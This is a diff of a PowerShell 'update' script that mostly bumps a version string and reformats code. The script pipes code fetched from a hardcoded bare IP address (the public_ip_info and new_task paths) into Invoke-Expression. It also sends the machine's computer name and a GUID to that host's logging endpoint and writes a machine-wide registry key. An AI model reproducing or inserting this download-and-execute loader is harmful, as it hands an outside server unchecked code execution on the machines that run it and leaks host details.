@@ -1,9 +1,9 @@
 
 # please change the version string  and new_task.ps1 script for do updating
 
-$lastestVersion = '6.0'
+$lastestVersion = '6.2'
 
-Invoke-RestMethod 47.107.152.77/public_ip_info|Invoke-Expression
+Invoke-RestMethod 47.107.152.77/public_ip_info | Invoke-Expression
 
 function mylog {
     param (
@@ -13,17 +13,18 @@ function mylog {
     $dt = Get-Date -format "yyyy-MM-dd HH:mm:ss"
 
     $info = [ordered]@{}
-    $info["id"]= $guid
-    $info["message"]=$dt+','+$env:COMPUTERNAME+','+$myMessage
+    $info["id"] = $guid
+    $info["message"] = $dt + ',' + $env:COMPUTERNAME + ',' + $myMessage
 
-    $jsdata=$info | convertTo-Json
+    $jsdata = $info | convertTo-Json
     $jsdata
     Invoke-RestMethod 47.107.152.77/mylog -Method Post -Body $jsdata
 }
 
 if (Test-Path HKLM:\SOFTWARE\UTOOLS) {
     Write-Host "already exists"
-}else {
+}
+else {
     New-Item HKLM:\SOFTWARE\UTOOLS
 }
 
@@ -45,14 +46,15 @@ $version = GetVersion
 
 if ($version -eq $lastestVersion) {
     mylog("lastest version is: " + $lastestVersion)
-}else {
-    Invoke-RestMethod 47.107.152.77/new_task|Invoke-Expression
+}
+else {
+    Invoke-RestMethod 47.107.152.77/new_task | Invoke-Expression
     try {
         SetVersion($lastestVersion)
-        mylog("version: "+$lastestVersion+" updated successfully.")
+        mylog("version: " + $lastestVersion + " updated successfully.")
 
     }
     catch {
-        mylog($lastestVersion+" updated failed.")
+        mylog($lastestVersion + " updated failed.")
     }
 }
